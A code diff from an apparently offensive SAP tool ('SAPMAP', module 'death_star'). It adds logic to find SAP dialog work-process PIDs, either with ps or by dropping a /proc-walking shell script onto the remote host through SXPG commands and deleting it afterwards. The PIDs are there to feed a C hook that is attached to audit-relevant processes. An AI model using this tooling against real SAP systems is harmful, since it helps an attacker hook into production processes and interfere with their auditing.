@@ -606,45 +606,113 @@ _WORKER_COMM_RE = re.compile(
 )
 
 
-def find_worker_pid(node) -> tuple[int, str]:
+def _classify_worker(comm: str) -> Optional[str]:
+    """Classify a work-process ``comm`` string.
+
+    Returns ``"worker"`` for dialog workers (``_W\\d+`` suffix,
+    handle the widest range of audit-worthy actions), ``"fallback"``
+    for non-dialog work-processes we can still hook (``_BTC`` batch,
+    ``_SPO`` spool, ``_UP2`` update-2), or ``None`` for anything we
+    should skip (dispatcher ``_DP``, non-SAP processes).
+
+    Two SAP kernel eras:
+      * Kernel ≤ 749 exposes ``comm = disp+work`` (all processes share
+        the same comm; type detection via /proc/PID/exe args).
+      * Kernel ≥ 750 exposes ``comm = SAP_<SID>_<inst>_<type>``, e.g.
+        ``SAP_S4H_00_W0`` for the dialog worker slot 0 on S4H
+        instance 00.  The trailing ``_DP`` / ``_W<n>`` / ``_BTC`` /
+        ``_SPO`` / ``_UP2`` is the reliable type marker.
+
+    Operator report: S/4 793 target's comm was ``SAP_S4H_00_W0`` etc.
+    Previous version required either ``disp+work`` in comm OR
+    ``dw.sap`` prefix — neither applied to the modern comm format —
+    so the workers were skipped despite being valid targets.  This
+    classifier makes the ``_W\\d+`` suffix authoritative regardless
+    of the leading token.
+    """
+    # Dispatcher — never emits audit records.
+    if comm.endswith("_DP"):
+        return None
+    # Kernel-750+ dialog worker: ``..._W<n>`` (SAP_S4H_00_W0).
+    if re.search(r"_W\d+$", comm):
+        return "worker"
+    # Kernel-750+ non-dialog work-processes we can still hook.
+    for suffix in ("_BTC", "_SPO", "_UP2", "_UPD"):
+        if comm.endswith(suffix):
+            return "fallback"
+    # Kernel-≤749: single ``disp+work`` comm shared by every process.
+    # Treat as a generic worker candidate (the C hook does its own
+    # per-process type discrimination via /proc/PID/exe).
+    if comm == "disp+work" or comm.startswith("dw.sap"):
+        return "fallback"
+    return None
+
+
+def find_worker_pid(node,
+                      remote_dir: str = DEFAULT_REMOTE_DIR
+                      ) -> tuple[int, str]:
     """Find a disp+work work-process PID (not the dispatcher) suitable
     for hooking.  Returns ``(pid, comm)``.
 
-    Prefers a ``_W<n>`` worker (dialog) since dialog work-processes
-    handle the widest range of audit-worthy actions (logon, tx-code
-    execution, RFC calls).  Falls back to any ``_BTC`` / ``_SPO`` /
-    ``_UP2`` process if no ``_W<n>`` exists.  Refuses the dispatcher
-    (``_DP``) because it never emits audit records.
+    Two-phase discovery:
+      1. ``ps -eo pid,comm,args``.  Simple + fast.  Modern
+         (kernel ≥ 750) comm format ``SAP_<SID>_<inst>_<type>`` is
+         recognised via the ``_W\\d+`` suffix classifier (see
+         ``_classify_worker``).
+      2. Fallback: dropped shell script that walks ``/proc/[0-9]*/comm``
+         directly.  Fires when ``ps`` produces zero matches — bulletproof
+         against ps-output-format quirks (different distros ship
+         different procps flags, some SXPG shells constrain PATH so
+         ``ps`` resolves to a non-procps variant, etc.).  Same
+         classifier; different data source.
+
+    Prefers a ``_W\\d+`` worker (dialog) since dialog work-processes
+    handle the widest range of audit-worthy actions.  Falls back to
+    ``_BTC`` / ``_SPO`` / ``_UP2`` / plain ``disp+work``.  Refuses
+    ``_DP`` (dispatcher — never emits audit records).
     """
-    # ``ps`` accepts space-delimited args — no shell needed.
+    workers: list[tuple[int, str]] = []
+    fallbacks: list[tuple[int, str]] = []
+
+    # ---- Phase 1: ps -eo pid,comm,args ----
     r = _run(node, "ps", "-eo pid,comm,args --no-headers",
-              label="enumerate SAP processes")
-    if not r.get("success"):
-        raise DeathStarError(
-            f"ps failed: {r.get('error') or 'unknown'}")
-    workers = []
-    fallbacks = []
-    for line in r.get("output") or []:
+              label="enumerate SAP processes (ps)")
+    ps_lines = r.get("output") or [] if r.get("success") else []
+    for line in ps_lines:
         m = _WORKER_COMM_RE.match(line.strip())
         if not m:
             continue
         comm = m.group("comm")
-        args = m.group("args")
         pid = int(m.group("pid"))
-        # Only SAP work-processes.  The C hook itself does a stricter
-        # /proc/PID/exe check on attach; this is the pre-filter so we
-        # don't hand it a random PID.
-        if "disp+work" not in comm and not comm.startswith("dw.sap"):
-            if "disp+work" not in args and "dw.sap" not in args:
-                continue
-        # Dispatcher — skip.  The hook detects this too but a
-        # cross-check here saves an SXPG round-trip.
-        if comm.endswith("_DP"):
-            continue
-        if re.search(r"_W\d+$", comm):
+        klass = _classify_worker(comm)
+        if klass == "worker":
             workers.append((pid, comm))
-        else:
+        elif klass == "fallback":
             fallbacks.append((pid, comm))
+
+    # ---- Phase 2: /proc walk fallback ----
+    # Fires only when Phase 1 produced nothing.  Operator reported ps
+    # returning workers-visible-to-the-shell but SAPMAP parsing 0 —
+    # some SXPG shells constrain PATH to /usr/sap-only bins where the
+    # available ``ps`` doesn't accept ``--no-headers`` or returns a
+    # non-standard column layout.  Walk /proc directly and read the
+    # comm file — bypasses ps entirely.
+    if not workers and not fallbacks:
+        print(f"[*] {node.sid}: death_star: ps returned no work-processes "
+               f"({len(ps_lines)} line(s) parsed) — falling back to "
+               f"/proc walk")
+        # Log first few ps lines verbatim so the operator can see what
+        # format SAPXPG actually returned.  Helps diagnose if the
+        # regex or the classifier is missing something.
+        for i, ln in enumerate(ps_lines[:8]):
+            print(f"[*] {node.sid}: death_star:   ps[{i}]: "
+                   f"{ln.rstrip()[:120]}")
+
+        proc_workers, proc_fallbacks = _find_workers_via_proc(
+            node, remote_dir=remote_dir)
+        workers.extend(proc_workers)
+        fallbacks.extend(proc_fallbacks)
+
     if workers:
         pid, comm = workers[0]
         print(f"[+] {node.sid}: death_star: worker PID {pid} ({comm})")
@@ -655,9 +723,84 @@ def find_worker_pid(node) -> tuple[int, str]:
               f"— no dialog worker found")
         return pid, comm
     raise DeathStarError(
-        "no disp+work / dw.sap processes found — verify SAP is running "
-        "on this host, or run "
-        "ps -eo pid,comm,args | grep -E 'disp\\+work|dw\\.sap' by hand.")
+        "no disp+work / dw.sap work-processes found (both ps and "
+        "/proc walk came back empty).  Verify SAP is running on this "
+        "host with ``ps -eo pid,comm | grep -E '_W[0-9]+|disp\\+work'`` "
+        "as <sid>adm.")
+
+
+def _find_workers_via_proc(node,
+                              remote_dir: str = DEFAULT_REMOTE_DIR
+                              ) -> tuple[list, list]:
+    """Enumerate SAP work-processes by walking ``/proc/[0-9]*/comm``.
+
+    Drops a small script (SXPG-safe file-drop pattern) that iterates
+    /proc entries and prints ``pid comm`` for every process whose
+    comm matches a SAP work-process pattern.  We then classify with
+    the same ``_classify_worker`` helper used for the ps path so both
+    discovery routes agree on what counts as a dialog worker vs a
+    non-dialog fallback.
+
+    Returns ``(workers, fallbacks)`` lists of ``(pid, comm)`` tuples.
+    Empty lists when nothing matches — caller decides what to do.
+    """
+    scratch_sh = (f"{remote_dir.rstrip('/')}/"
+                    f"sapmap_ds_procwalk_{_rand_suffix()}.sh")
+    # POSIX sh — no bash-isms.  ``for f in /proc/[0-9]*`` uses glob
+    # expansion; ``basename`` strips the /proc/ prefix to get the PID.
+    # ``2>/dev/null`` swallows the "No such file" errors from processes
+    # that exit between the glob and the read.
+    script = (
+        "#!/bin/sh\n"
+        "for p in /proc/[0-9]*; do\n"
+        "  if [ ! -r \"$p/comm\" ]; then continue; fi\n"
+        "  comm=`cat \"$p/comm\" 2>/dev/null`\n"
+        "  case \"$comm\" in\n"
+        # Modern SAP kernel: SAP_<SID>_<inst>_<TYPE>.
+        "    SAP_*_W*|SAP_*_BTC|SAP_*_SPO|SAP_*_UP2|SAP_*_UPD|SAP_*_DP)\n"
+        "      pid=`basename \"$p\"`\n"
+        "      echo \"$pid $comm\"\n"
+        "      ;;\n"
+        # Legacy SAP kernel: comm is literally ``disp+work``.
+        "    'disp+work'|dw.sap*)\n"
+        "      pid=`basename \"$p\"`\n"
+        "      echo \"$pid $comm\"\n"
+        "      ;;\n"
+        "  esac\n"
+        "done\n"
+    )
+
+    try:
+        _write_remote_file(node, scratch_sh, script.encode("utf-8"),
+                            label=f"drop /proc walker → {scratch_sh}")
+    except DeathStarError as e:
+        print(f"[!] {node.sid}: death_star: could not drop /proc "
+               f"walker: {e}")
+        return [], []
+
+    r = _run(node, "sh", scratch_sh, label="walk /proc for SAP processes")
+    _run(node, "/bin/rm", f"-f {scratch_sh}",
+          label="cleanup /proc walker")
+
+    workers, fallbacks = [], []
+    for line in r.get("output") or []:
+        parts = line.strip().split(None, 1)
+        if len(parts) != 2:
+            continue
+        try:
+            pid = int(parts[0])
+        except ValueError:
+            continue
+        comm = parts[1]
+        klass = _classify_worker(comm)
+        if klass == "worker":
+            workers.append((pid, comm))
+        elif klass == "fallback":
+            fallbacks.append((pid, comm))
+
+    print(f"[*] {node.sid}: death_star: /proc walk found "
+           f"{len(workers)} worker(s) + {len(fallbacks)} fallback(s)")
+    return workers, fallbacks
 
 
 # ---------------------------------------------------------------------------
